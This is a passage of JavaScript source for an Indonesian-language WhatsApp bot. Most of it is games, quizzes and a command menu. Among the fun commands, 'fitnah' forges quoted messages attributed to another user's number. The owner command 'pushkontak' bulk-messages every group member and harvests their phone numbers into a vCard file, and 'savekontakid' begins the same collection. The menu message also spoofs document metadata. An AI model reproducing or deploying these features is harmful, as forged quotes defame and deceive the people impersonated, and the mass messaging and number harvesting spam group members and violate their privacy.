					let sifat_b = [
						"Sombong",
						"Minder",
						"Pendendam",
						"Sensitif",
						"Perfeksionis",
						"Caper",
						"Pelit",
						"Egois",
						"Pesimis",
						"Penyendiri",
						"Manipulatif",
						"Labil",
						"Penakut",
						"Vulgar",
						"Tidak setia",
						"Pemalas",
						"Kasar",
						"Rumit",
						"Boros",
						"Keras kepala",
						"Tidak bijak",
						"Pembelot",
						"Serakah",
						"Tamak",
						"Penggosip",
						"Rasis",
						"Ceroboh",
						"Intoleran"
					];
					let teks = `╭──❍「 *Cek Sifat* 」❍\n│• Sifat ${
						text && m.mentionedJid
							? text
							: "@" + m.sender.split("@")[0]
					}${
						text && m.mentionedJid
							? ""
							: `\n│• Nama : *${text ? text : m.pushName}*` ||
							  "\n│• Nama : *Tanpa Nama*"
					}\n│• Orang yang : *${pickRandom(
						sifat_a
					)}*\n│• Kekurangan : *${pickRandom(
						sifat_b
					)}*\n│• Keberanian : *${Math.floor(
						Math.random() * 100
					)}%*\n│• Kepedulian : *${Math.floor(
						Math.random() * 100
					)}%*\n│• Kecemasan : *${Math.floor(
						Math.random() * 100
					)}%*\n│• Ketakutan : *${Math.floor(
						Math.random() * 100
					)}%*\n│• Akhlak Baik : *${Math.floor(
						Math.random() * 100
					)}%*\n│• Akhlak Buruk : *${Math.floor(
						Math.random() * 100
					)}%*\n╰──────❍`;
					m.reply(teks);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "cekkhodam":
				{
					//  if (cekLimit(m, db)) return m.reply(mess.limit);
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!text)
						return m.reply(`Example : ${prefix + command} nama lu`);
					let anu = await cekKhodam(text);
					m.reply(`Khodam dari *${text}* adalah *${anu}*`);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "rate":
			case "nilai":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					let rate = Math.floor(Math.random() * 100);
					m.reply(`Rate Bot : *${rate}%*`);
				}
				break;
			case "jodohku":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (!m.isGroup) return vipReply(mess.group);
					let member = (
						store.groupMetadata[m.chat].participants ||
						m.metadata.participants
					).map((a) => a.id);
					let jodoh = pickRandom(member);
					m.reply(
						`👫Jodoh mu adalah\n@${m.sender.split("@")[0]} ❤ @${
							jodoh.split("@")[0]
						}`
					);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "jadian":
				{
					await jeda(2000);
					if (cekLimit(m, db)) return m.reply(mess.limit);
					if (!m.isGroup) return vipReply(mess.group);
					let member = (
						store.groupMetadata[m.chat].participants ||
						m.metadata.participants
					).map((a) => a.id);
					let jadian1 = pickRandom(member);
					let jadian2 = pickRandom(member);
					m.reply(
						`Ciee yang Jadian💖 Jangan lupa Donasi🗿\n@${
							jadian1.split("@")[0]
						} ❤ @${jadian2.split("@")[0]}`
					);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "fitnah":
				{
					await jeda(2000);
					if (cekLimit(m, db)) return m.reply(mess.limit);
					let [teks1, teks2, teks3] = text.split`|`;
					if (!teks1 || !teks2 || !teks3)
						return m.reply(
							`Example : ${
								prefix + command
							} pesan target|pesan mu|nomer/tag target`
						);
					let ftelo = {
						key: {
							fromMe: false,
							participant:
								teks3.replace(/[^0-9]/g, "") +
								"@s.whatsapp.net",
							...(m.isGroup
								? { remoteJid: m.chat }
								: {
										remoteJid:
											teks3.replace(/[^0-9]/g, "") +
											"@s.whatsapp.net"
								  })
						},
						message: { conversation: teks1 }
					};
					xzuya.sendMessage(
						m.chat,
						{ text: teks2 },
						{ quoted: ftelo }
					);
					db.users[m.sender].limit -= 1;
				}
				break;

			// Game Menu
			case "slot":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					await gameSlot(xzuya, m, db);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "casino":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					await gameCasinoSolo(xzuya, m, prefix, db);
					db.users[m.sender].limit -= 1;
				}
				break;
			case "rampok":
			case "merampok":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					await gameMerampok(m, db);
				}
				break;
			case "begal":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					await gameBegal(xzuya, m, db);
				}
				break;
			case "suitpvp":
			case "suit":
				{
					await jeda(2000);
					if (cekLimit(m, db)) return m.reply(mess.limit);
					db.users[m.sender].limit -= 1;
					let poin = 10;
					let poin_lose = 10;
					let timeout = 60000;
					if (
						Object.values(suit).find(
							(roof) =>
								roof.id.startsWith("suit") &&
								[roof.p, roof.p2].includes(m.sender)
						)
					)
						m.reply(`Selesaikan suit mu yang sebelumnya`);
					if (m.mentionedJid[0] === m.sender)
						return m.reply(
							`Tidak bisa bermain dengan diri sendiri !`
						);
					if (!m.mentionedJid[0])
						return m.reply(
							`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[0]}`,
							m.chat,
							{ mentions: [owner[1] + "@s.whatsapp.net"] }
						);
					if (
						Object.values(suit).find(
							(roof) =>
								roof.id.startsWith("suit") &&
								[roof.p, roof.p2].includes(m.mentionedJid[0])
						)
					)
						return m.reply(
							`Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
						);
					let id = "suit_" + new Date() * 1;
					let caption = `_*SUIT PvP*_\n\n@${
						m.sender.split`@`[0]
					} menantang @${
						m.mentionedJid[0].split`@`[0]
					} untuk bermain suit\n\nSilahkan @${
						m.mentionedJid[0].split`@`[0]
					} untuk ketik terima/tolak`;
					suit[id] = {
						chat: m.reply(caption),
						id: id,
						p: m.sender,
						p2: m.mentionedJid[0],
						status: "wait",
						waktu: setTimeout(() => {
							if (suit[id]) m.reply(`_Waktu suit habis_`);
							delete suit[id];
						}, 60000),
						poin,
						poin_lose,
						timeout
					};
				}
				break;
			case "ttc":
			case "ttt":
			case "tictactoe":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					db.users[m.sender].limit -= 1;
					await jeda(2000);
					let TicTacToe = require("./lib/tictactoe");
					if (
						Object.values(tictactoe).find(
							(room) =>
								room.id.startsWith("tictactoe") &&
								[room.game.playerX, room.game.playerO].includes(
									m.sender
								)
						)
					)
						return m.reply(
							`Kamu masih didalam game!\nKetik *${prefix}del${command}* Jika Ingin Mengakhiri sesi`
						);
					let room = Object.values(tictactoe).find(
						(room) =>
							room.state === "WAITING" &&
							(text ? room.name === text : true)
					);
					if (room) {
						m.reply("Partner ditemukan!");
						room.o = m.chat;
						room.game.playerO = m.sender;
						room.state = "PLAYING";
						let arr = room.game.render().map((v) => {
							return {
								X: "❌",
								O: "⭕",
								1: "1️⃣",
								2: "2️⃣",
								3: "3️⃣",
								4: "4️⃣",
								5: "5️⃣",
								6: "6️⃣",
								7: "7️⃣",
								8: "8️⃣",
								9: "9️⃣"
							}[v];
						});
						let str = `Room ID: ${room.id}\n\n${arr
							.slice(0, 3)
							.join("")}\n${arr.slice(3, 6).join("")}\n${arr
							.slice(6)
							.join("")}\n\nMenunggu @${
							room.game.currentTurn.split("@")[0]
						}\n\nKetik *nyerah* untuk menyerah dan mengakui kekalahan`;
						if (room.x !== room.o)
							await xzuya.sendMessage(
								room.x,
								{ texr: str, mentions: parseMention(str) },
								{ quoted: m }
							);
						await xzuya.sendMessage(
							room.o,
							{ text: str, mentions: parseMention(str) },
							{ quoted: m }
						);
					} else {
						room = {
							id: "tictactoe-" + +new Date(),
							x: m.chat,
							o: "",
							game: new TicTacToe(m.sender, "o"),
							state: "WAITING",
							waktu: setTimeout(() => {
								if (tictactoe[roomnya.id])
									m.reply(`_Waktu ${command} habis_`);
								delete tictactoe[roomnya.id];
							}, 300000)
						};
						if (text) room.name = text;
						xzuya.sendMessage(
							m.chat,
							{
								text:
									"Menunggu partner" +
									(text
										? ` mengetik command dibawah ini ${prefix}${command} ${text}`
										: ""),
								mentions: m.mentionedJid
							},
							{ quoted: m }
						);
						tictactoe[room.id] = room;
					}
				}
				break;
			case "tebakbom":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					db.users[m.sender].limit -= 1;
					await jeda(2000);
					if (tebakbom[m.sender])
						return m.reply(
							"Masih Ada Sesi Yang Belum Diselesaikan!"
						);
					function shuffle(array) {
						return array.sort(() => Math.random() - 0.5);
					}
					tebakbom[m.sender] = {
						petak: shuffle([0, 0, 0, 2, 0, 2, 0, 2, 0, 0]),
						board: [
							"1️⃣",
							"2️⃣",
							"3️⃣",
							"4️⃣",
							"5️⃣",
							"6️⃣",
							"7️⃣",
							"8️⃣",
							"9️⃣",
							"🔟"
						],
						bomb: 3,
						lolos: 7,
						pick: 0,
						nyawa: ["❤️", "❤️", "❤️"],
						waktu: setTimeout(() => {
							if (tebakbom[m.sender])
								m.reply(`_Waktu ${command} habis_`);
							delete tebakbom[m.sender];
						}, 120000)
					};
					m.reply(
						`*TEBAK BOM*\n\n${tebakbom[m.sender].board.join(
							""
						)}\n\nPilih lah nomor tersebut! dan jangan sampai terkena Bom!\nBomb : ${
							tebakbom[m.sender].bomb
						}\nNyawa : ${tebakbom[m.sender].nyawa.join("")}`
					);
				}
				break;
			case "tekateki":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (iGame(tekateki, m.chat))
						return m.reply(
							"Masih Ada Sesi Yang Belum Diselesaikan!"
						);
					const hasil = pickRandom(
						JSON.parse(
							fs.readFileSync("./database/games/tekateki.json")
						)
					);
					let { key } = await m.reply(
						`🎮 Teka Teki Berikut :\n\n${hasil.soal}\n\nWaktu : 60s\nHadiah *+3499*`
					);
					tekateki[m.chat + key.id] = {
						jawaban: hasil.jawaban.toLowerCase(),
						id: key.id
					};
					await sleep(60000);
					if (rdGame(tekateki, m.chat, key.id)) {
						m.reply(
							"Waktu Habis\nJawaban: " +
								tekateki[m.chat + key.id].jawaban
						);
						delete tekateki[m.chat + key.id];
					}
				}
				break;
			case "tebaklirik":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (iGame(tebaklirik, m.chat))
						return m.reply(
							"Masih Ada Sesi Yang Belum Diselesaikan!"
						);
					const hasil = pickRandom(
						JSON.parse(
							fs.readFileSync("./database/games/tebaklirik.json")
						)
					);
					let { key } = await m.reply(
						`🎮 Tebak Lirik Berikut :\n\n${hasil.soal}\n\nWaktu : 90s\nHadiah *+4299*`
					);
					tebaklirik[m.chat + key.id] = {
						jawaban: hasil.jawaban.toLowerCase(),
						id: key.id
					};
					await sleep(90000);
					if (rdGame(tebaklirik, m.chat, key.id)) {
						m.reply(
							"Waktu Habis\nJawaban: " +
								tebaklirik[m.chat + key.id].jawaban
						);
						delete tebaklirik[m.chat + key.id];
					}
				}
				break;
			case "tebaklagu":
				{
				}
				break;
			case "tebakkata":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (iGame(tebakkata, m.chat))
						return m.reply(
							"Masih Ada Sesi Yang Belum Diselesaikan!"
						);
					const hasil = pickRandom(
						JSON.parse(
							fs.readFileSync("./database/games/tebakkata.json")
						)
					);
					let { key } = await m.reply(
						`🎮 Tebak Kata Berikut :\n\n${hasil.soal}\n\nWaktu : 60s\nHadiah *+3499*`
					);
					tebakkata[m.chat + key.id] = {
						jawaban: hasil.jawaban.toLowerCase(),
						id: key.id
					};
					await sleep(60000);
					if (rdGame(tebakkata, m.chat, key.id)) {
						m.reply(
							"Waktu Habis\nJawaban: " +
								tebakkata[m.chat + key.id].jawaban
						);
						delete tebakkata[m.chat + key.id];
					}
				}
				break;
			case "family100":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (family100.hasOwnProperty(m.chat))
						return m.reply(
							"Masih Ada Sesi Yang Belum Diselesaikan!"
						);
					const hasil = pickRandom(
						JSON.parse(
							fs.readFileSync("./database/games/family100.json")
						)
					);
					let { key } = await m.reply(
						`🎮 Tebak Kata Berikut :\n\n${hasil.soal}\n\nWaktu : 5m\nHadiah *+3499*`
					);
					family100[m.chat] = {
						soal: hasil.soal,
						jawaban: hasil.jawaban,
						terjawab: Array.from(hasil.jawaban, () => false),
						id: key.id
					};
					await sleep(300000);
					if (family100.hasOwnProperty(m.chat)) {
						m.reply(
							"Waktu Habis\nJawaban:\n- " +
								family100[m.chat].jawaban.join("\n- ")
						);
						delete family100[m.chat];
					}
				}
				break;
			case "susunkata":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (iGame(susunkata, m.chat))
						return m.reply(
							"Masih Ada Sesi Yang Belum Diselesaikan!"
						);
					const hasil = pickRandom(
						JSON.parse(
							fs.readFileSync("./database/games/susunkata.json")
						)
					);
					let { key } = await m.reply(
						`🎮 Susun Kata Berikut :\n\n${hasil.soal}\nTipe : ${hasil.tipe}\n\nWaktu : 60s\nHadiah *+2989*`
					);
					susunkata[m.chat + key.id] = {
						jawaban: hasil.jawaban.toLowerCase(),
						id: key.id
					};
					await sleep(60000);
					if (rdGame(susunkata, m.chat, key.id)) {
						m.reply(
							"Waktu Habis\nJawaban: " +
								susunkata[m.chat + key.id].jawaban
						);
						delete susunkata[m.chat + key.id];
					}
				}
				break;
			case "tebakkimia":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (iGame(tebakkimia, m.chat))
						return m.reply(
							"Masih Ada Sesi Yang Belum Diselesaikan!"
						);
					const hasil = pickRandom(
						JSON.parse(
							fs.readFileSync("./database/games/tebakkimia.json")
						)
					);
					let { key } = await m.reply(
						`🎮 Tebak Kimia Berikut :\n\n${hasil.unsur}\n\nWaktu : 60s\nHadiah *+3499*`
					);
					tebakkimia[m.chat + key.id] = {
						jawaban: hasil.lambang.toLowerCase(),
						id: key.id
					};
					await sleep(60000);
					if (rdGame(tebakkimia, m.chat, key.id)) {
						m.reply(
							"Waktu Habis\nJawaban: " +
								tebakkimia[m.chat + key.id].jawaban
						);
						delete tebakkimia[m.chat + key.id];
					}
				}
				break;
			case "caklontong":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (iGame(caklontong, m.chat))
						return m.reply(
							"Masih Ada Sesi Yang Belum Diselesaikan!"
						);
					const hasil = pickRandom(
						JSON.parse(
							fs.readFileSync("./database/games/caklontong.json")
						)
					);
					let { key } = await m.reply(
						`🎮 Jawab Pertanyaan Berikut :\n\n${hasil.soal}\n\nWaktu : 60s\nHadiah *+9999*`
					);
					caklontong[m.chat + key.id] = {
						...hasil,
						jawaban: hasil.jawaban.toLowerCase(),
						id: key.id
					};
					await sleep(60000);
					if (rdGame(caklontong, m.chat, key.id)) {
						m.reply(
							`Waktu Habis\nJawaban: ${
								caklontong[m.chat + key.id].jawaban
							}\n"${caklontong[m.chat + key.id].deskripsi}"`
						);
						delete caklontong[m.chat + key.id];
					}
				}
				break;
			case "tebaknegara":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (iGame(tebaknegara, m.chat))
						return m.reply(
							"Masih Ada Sesi Yang Belum Diselesaikan!"
						);
					const hasil = pickRandom(
						JSON.parse(
							fs.readFileSync("./database/games/tebaknegara.json")
						)
					);
					let { key } = await m.reply(
						`🎮 Tebak Negara Dari Tempat Berikut :\n\n*Tempat : ${hasil.tempat}*\n\nWaktu : 60s\nHadiah *+3499*`
					);
					tebaknegara[m.chat + key.id] = {
						jawaban: hasil.negara.toLowerCase(),
						id: key.id
					};
					await sleep(60000);
					if (rdGame(tebaknegara, m.chat, key.id)) {
						m.reply(
							"Waktu Habis\nJawaban: " +
								tebaknegara[m.chat + key.id].jawaban
						);
						delete tebaknegara[m.chat + key.id];
					}
				}
				break;
			case "tebakgambar":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (iGame(tebakgambar, m.chat))
						return m.reply(
							"Masih Ada Sesi Yang Belum Diselesaikan!"
						);
					const hasil = pickRandom(
						JSON.parse(
							fs.readFileSync("./database/games/tebakgambar.json")
						)
					);
					let { key } = await xzuya.sendFileUrl(
						m.chat,
						hasil.img,
						`🎮 Tebak Gambar Berikut :\n\n${hasil.deskripsi}\n\nWaktu : 60s\nHadiah *+3499*`,
						m
					);
					tebakgambar[m.chat + key.id] = {
						jawaban: hasil.jawaban.toLowerCase(),
						id: key.id
					};
					await sleep(60000);
					if (rdGame(tebakgambar, m.chat, key.id)) {
						m.reply(
							"Waktu Habis\nJawaban: " +
								tebakgambar[m.chat + key.id].jawaban
						);
						delete tebakgambar[m.chat + key.id];
					}
				}
				break;
			case "tebakbendera":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					if (iGame(tebakbendera, m.chat))
						return m.reply(
							"Masih Ada Sesi Yang Belum Diselesaikan!"
						);
					const hasil = pickRandom(
						JSON.parse(
							fs.readFileSync(
								"./database/games/tebakbendera.json"
							)
						)
					);
					let { key } = await m.reply(
						`🎮 Tebak Bendera Berikut :\n\n*Bendera : ${hasil.bendera}*\n\nWaktu : 60s\nHadiah *+3499*`
					);
					tebakbendera[m.chat + key.id] = {
						jawaban: hasil.negara.toLowerCase(),
						id: key.id
					};
					await sleep(60000);
					if (rdGame(tebakbendera, m.chat, key.id)) {
						m.reply(
							"Waktu Habis\nJawaban: " +
								tebakbendera[m.chat + key.id].jawaban
						);
						delete tebakbendera[m.chat + key.id];
					}
				}
				break;
			case "kuismath":
			case "math":
				{
					if (cekLimit(m, db)) return m.reply(mess.limit);
					await jeda(2000);
					const { genMath, modes } = require("./lib/math");
					const inputMode = [
						"noob",
						"easy",
						"medium",
						"hard",
						"extreme",
						"impossible",
						"impossible2"
					];
					if (iGame(kuismath, m.chat))
						return m.reply(
							"Masih Ada Sesi Yang Belum Diselesaikan!"
						);
					if (!text)
						return m.reply(
							`Mode: ${Object.keys(modes).join(
								" | "
							)}\nContoh penggunaan: ${prefix}math medium`
						);
					if (!inputMode.includes(text.toLowerCase()))
						return m.reply("Mode tidak ditemukan!");
					let result = await genMath(text.toLowerCase());
					let { key } = await m.reply(
						`*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu : ${(
							result.waktu / 1000
						).toFixed(2)} detik`
					);
					kuismath[m.chat + key.id] = {
						jawaban: result.jawaban,
						mode: text.toLowerCase(),
						id: key.id
					};
					await sleep(kuismath, result.waktu);
					if (rdGame(m.chat + key.id)) {
						m.reply(
							"Waktu Habis\nJawaban: " +
								kuismath[m.chat + key.id].jawaban
						);
						delete kuismath[m.chat + key.id];
					}
				}
				break;

			// Menu
			case "allmenu":
			case "menu":
				{
					await jeda(2000);
					let profile;
					try {
						profile = await xzuya.profilePictureUrl(
							m.sender,
							"image"
						);
					} catch (e) {
						profile = fake.anonim;
					}
					const menunya = `
╭──❍「 *USER INFO* 」❍
├ *Nama* : ${m.pushName ? m.pushName : "Tanpa Nama"}
├ *Id* : @${m.sender.split("@")[0]}
├ *User* : ${isVip ? "VIP" : isPremium ? "PREMIUM" : "FREE"}
├ *Limit* : ${isVip ? "VIP" : db.users[m.sender].limit}
├ *Uang* : ${
						db.users[m.sender]
							? db.users[m.sender].uang.toLocaleString("id-ID")
							: "0"
					}
╰─┬────❍
╭─┴─❍「 *BOT INFO* 」❍
├ *Nama Bot* : ${botname}
├ *Powered* : @${"0@s.whatsapp.net".split("@")[0]}
├ *Owner* : @${owner[0].split("@")[0]}
├ *Mode* : ${xzuya.public ? "Public" : "Self"}
├ *Prefix* :${
						db.set[botNumber].multiprefix
							? "「 MULTI-PREFIX 」"
							: " *" + prefix + "*"
					}
╰─┬────❍
╭─┴─❍「 *ABOUT* 」❍
├ *Tanggal* : ${tanggal}
├ *Hari* : ${hari}
├ *Jam* : ${jam} WIB
╰──────❍
╭──❍「 *BOT* 」❍
│${setv} ${prefix}profile
│${setv} ${prefix}claim
│${setv} ${prefix}buy [item] (nominal)
│${setv} ${prefix}transfer
│${setv} ${prefix}leaderboard
│${setv} ${prefix}request (text)
│${setv} ${prefix}react (emoji)
│${setv} ${prefix}tagme
│${setv} ${prefix}runtime
│${setv} ${prefix}totalfitur
│${setv} ${prefix}ping
│${setv} ${prefix}afk
│${setv} ${prefix}rvo (reply pesan viewone)
│${setv} ${prefix}inspect (url gc)
│${setv} ${prefix}addmsg
│${setv} ${prefix}delmsg
│${setv} ${prefix}getmsg
│${setv} ${prefix}listmsg
│${setv} ${prefix}q (reply pesan)
│${setv} ${prefix}menfes (62xxx|nama samaran)
╰─┬────❍
╭─┴❍「 *GROUP* 」❍
│${setv} ${prefix}add (62xxx)
│${setv} ${prefix}kick (@tag/62xxx)
│${setv} ${prefix}promote (@tag/62xxx)
│${setv} ${prefix}demote (@tag/62xxx)
│${setv} ${prefix}setname (nama baru gc)
│${setv} ${prefix}setdesc (desk)
│${setv} ${prefix}setppgc (reply imgnya)
│${setv} ${prefix}delete (reply pesan)
│${setv} ${prefix}linkgrup
│${setv} ${prefix}revoke
│${setv} ${prefix}tagall
│${setv} ${prefix}hidetag
│${setv} ${prefix}totag (reply pesan)
│${setv} ${prefix}listonline
│${setv} ${prefix}group set
│${setv} ${prefix}antilink (on/off)
│${setv} ${prefix}welcome (on/off)
│${setv} ${prefix}antidelete (on/off)
╰─┬────❍
╭─┴❍「 *SEARCH* 」❍
│${setv} ${prefix}ytsearch (query)
│${setv} ${prefix}pixiv (query)
│${setv} ${prefix}pinterest (query)
│${setv} ${prefix}wallpaper (query)
│${setv} ${prefix}ringtone (query)
│${setv} ${prefix}google (query)
│${setv} ${prefix}gimage (query)
│${setv} ${prefix}npm (query)
│${setv} ${prefix}style (query)
│${setv} ${prefix}cuaca (kota)
╰─┬────❍
╭─┴❍「 *DOWNLOAD* 」❍
│${setv} ${prefix}ytmp3 (url)
│${setv} ${prefix}ytmp4 (url)
│${setv} ${prefix}instagram (url)
│${setv} ${prefix}tiktok (url)
│${setv} ${prefix}facebook (url)
│${setv} ${prefix}mediafire (url)
╰─┬────❍
╭─┴❍「 *QUOTES* 」❍
│${setv} ${prefix}motivasi
│${setv} ${prefix}quotes
│${setv} ${prefix}truth
│${setv} ${prefix}renungan
╰─┬────❍
╭─┴❍「 *TOOLS* 」❍
│${setv} ${prefix}get (url)
│${setv} ${prefix}hd (reply pesan)
│${setv} ${prefix}toaudio (reply pesan)
│${setv} ${prefix}tomp3 (reply pesan)
│${setv} ${prefix}tovn (reply pesan)
│${setv} ${prefix}toimage (reply pesan)
│${setv} ${prefix}toptv (reply pesan)
│${setv} ${prefix}tourl (reply pesan)
│${setv} ${prefix}tts (textnya)
│${setv} ${prefix}toqr (textnya)
│${setv} ${prefix}ssweb (url)
│${setv} ${prefix}sticker (send/reply img)
│${setv} ${prefix}colong (reply stiker)
│${setv} ${prefix}smeme (send/reply img)
│${setv} ${prefix}emojimix 🙃+💀
│${setv} ${prefix}nulis
│${setv} ${prefix}readmore text1|text2
│${setv} ${prefix}qc (pesannya)
│${setv} ${prefix}translate
│${setv} ${prefix}wasted (send/reply img)
│${setv} ${prefix}triggered (send/reply img)
│${setv} ${prefix}shorturl (urlnya)
│${setv} ${prefix}gitclone (urlnya)
│${setv} ${prefix}fat (reply audio)
│${setv} ${prefix}fast (reply audio)
│${setv} ${prefix}bass (reply audio)
│${setv} ${prefix}slow (reply audio)
│${setv} ${prefix}tupai (reply audio)
│${setv} ${prefix}deep (reply audio)
│${setv} ${prefix}robot (reply audio)
│${setv} ${prefix}blown (reply audio)
│${setv} ${prefix}reverse (reply audio)
│${setv} ${prefix}smooth (reply audio)
│${setv} ${prefix}earrape (reply audio)
│${setv} ${prefix}nightcore (reply audio)
│${setv} ${prefix}getexif (reply sticker)
╰─┬────❍
╭─┴❍「 *AI* 」❍
│${setv} ${prefix}ai (query)
│${setv} ${prefix}simi (query)
│${setv} ${prefix}txt2img (query)
╰─┬────❍
╭─┴❍「 *ANIME* 」❍
│${setv} ${prefix}waifu
│${setv} ${prefix}neko
╰─┬────❍
╭─┴❍「 *GAME* 」❍
│${setv} ${prefix}tictactoe
│${setv} ${prefix}suit
│${setv} ${prefix}slot
│${setv} ${prefix}math (level)
│${setv} ${prefix}begal
│${setv} ${prefix}casino (nominal)
│${setv} ${prefix}rampok (@tag)
│${setv} ${prefix}tekateki
│${setv} ${prefix}tebaklirik
│${setv} ${prefix}tebakkata
│${setv} ${prefix}tebakbom
│${setv} ${prefix}susunkata
│${setv} ${prefix}tebakkimia
│${setv} ${prefix}caklontong
│${setv} ${prefix}tebaknegara
│${setv} ${prefix}tebakgambar
│${setv} ${prefix}tebakbendera
╰─┬────❍
╭─┴❍「 *FUN* 」❍
│${setv} ${prefix}dadu
│${setv} ${prefix}bisakah (text)
│${setv} ${prefix}apakah (text)
│${setv} ${prefix}kapan (text)
│${setv} ${prefix}kerangajaib (text)
│${setv} ${prefix}cekmati (nama lu)
│${setv} ${prefix}ceksifat
│${setv} ${prefix}cekkhodam (nama lu)
│${setv} ${prefix}rate (reply pesan)
│${setv} ${prefix}jodohku
│${setv} ${prefix}jadian
│${setv} ${prefix}fitnah
│${setv} ${prefix}halah (text)
│${setv} ${prefix}hilih (text)
│${setv} ${prefix}huluh (text)
│${setv} ${prefix}heleh (text)
│${setv} ${prefix}holoh (text)
╰─┬────❍
╭─┴❍「 *RANDOM* 」❍
│${setv} ${prefix}randomcolor
│${setv} ${prefix}coffe
╰─┬────❍
╭─┴❍「 *PANEL* 」❍
│${setv} ${prefix}addpanel
│${setv} ${prefix}delpanel
│${setv} ${prefix}listpanel
│${setv} ${prefix}listadmin
│${setv} ${prefix}deladmin
╰─┬────❍
╭─┴❍「 *OWNER* 」❍
│${setv} ${prefix}mode (public or self)
│${setv} ${prefix}setbio
│${setv} ${prefix}setppbot
│${setv} ${prefix}join
│${setv} ${prefix}leave
│${setv} ${prefix}block
│${setv} ${prefix}listblock
│${setv} ${prefix}openblock
│${setv} ${prefix}listpc
│${setv} ${prefix}listgc
│${setv} ${prefix}creategc
│${setv} ${prefix}addprem
│${setv} ${prefix}delprem
│${setv} ${prefix}listprem
│${setv} ${prefix}addlimit
│${setv} ${prefix}adduang
│${setv} ${prefix}bot --settings
│${setv} ${prefix}bot settings
│${setv} ${prefix}getsession
│${setv} ${prefix}delsession
│${setv} ${prefix}delsampah
│${setv} $
│${setv} >
│${setv} <
╰──────❍`;
					await xzuya.sendMessage(
						m.chat,
						{
							document: fake.docs,
							fileName: ucapanWaktu,
							mimetype: pickRandom(fake.listfakedocs),
							fileLength: "100000000000000",
							pageCount: "999",
							caption: menunya,
							contextInfo: {
								mentionedJid: [
									m.sender,
									"0@s.whatsapp.net",
									owner[0] + "@s.whatsapp.net"
								],
								forwardingScore: 10,
								isForwarded: true,
								forwardedNewsletterMessageInfo: {
									newsletterJid: my.ch,
									serverMessageId: null,
									newsletterName: "Join For More Info"
								},
								externalAdReply: {
									title: author,
									body: packname,
									showAdAttribution: true,
									thumbnailUrl: profile,
									mediaType: 1,
									previewType: 0,
									renderLargerThumbnail: true,
									mediaUrl: my.gh,
									sourceUrl: my.gh
								}
							}
						},
						{ quoted: m }
					);
				}
				break;
			case "pushkontak":
				{
					if (!isCreator) return vipReply(mess.owner);
					if (!text)
						return m.reply(
							`Example : ${
								prefix + command
							} idgrup|pesannya\n\nketik *.listgc* untuk melihat semua list id grup`
						);
					const [idGrup, textNya] = text.split("|");
					let getIdMember;
					try {
						getIdMember = await xzuya.groupMetadata(idGrup);
					} catch (e) {
						m.reply(`ID GRUP TIDAK VALID`);
					}
					const participants = await getIdMember.participants;
					const halls = await participants
						.filter((v) => v.id.endsWith(".net"))
						.map((v) => v.id);
					m.reply(`Sedang Mengirim ke ${halls.length} MEMBER GRUP `);
					let count = 1;
					for (let member of halls) {
						if (member !== m.sender) {
							contacts.push(member);
							await fs.writeFileSync(
								"./database/contacts.json",
								JSON.stringify(contacts)
							);
							await xzuya.sendMessage(
								member,
								{
									text: `${textNya}\n> Member Ke ${count}/${halls.length}`
								},
								{ quoted: fkontak }
							);
							await jeda(delay);
							count++;
						}
					}
					try {
						const uniqueContacts = [...new Set(contacts)];
						const vcardContent = uniqueContacts
							.map((contact, index) => {
								const vcard = [
									"BEGIN:VCARD",
									"VERSION:3.0",
									`FN:WA[${index}] ${contact.split("@")[0]}`,
									`TEL;type=CELL;type=VOICE;waid=${
										contact.split("@")[0]
									}:+${contact.split("@")[0]}`,
									"END:VCARD",
									""
								].join("\n");
								return vcard;
							})
							.join("");
						fs.writeFileSync(
							"./database/contacts.vcf",
							vcardContent,
							"utf8"
						);
					} catch (e) {
						m.reply(e.toString());
					} finally {
						if (m.chat !== m.sender)
							await m.reply(
								`ALHAMDULILLAH SUKSES BOTZ KAZUYA STORE TELAH MENGIRIMKAN PESAN KE *${halls.length}* MEMBER GRUP  ✅  _FILE CONTACT BERHASIL DI KIRIM KE PRIVATE CHAT_`
							);
						await xzuya.sendMessage(
							m.sender,
							{
								document: fs.readFileSync(
									"./database/contacts.vcf"
								),
								fileName: "contacts.vcf",
								caption: "File Contact Berhasil Di Buat✅",
								mimetype: "text/vcard"
							},
							{ quoted: m }
						);
						contacts.splice(0, contacts.length);
						await fs.writeFileSync(
							"./database/contacts.json",
							JSON.stringify(contacts)
						);
						await fs.writeFileSync("./database/contacts.vcf", "");
					}
				}
				break;
			case "savekontakid":
				{
					if (!isCreator) return vipReply(mess.owner);
					if (!text)
						return vipReply(
							`Example : ${prefix + command} idgrup|nama`
						);
					const [idgrup, nama] = text.split("|");
					let groupMetadataa;
					try {
						groupMetadataa = await xzuya.groupMetadata(`${idgrup}`);
					} catch (e) {
						m.reply(`ID GRUP TIDAK VALID`);
					}
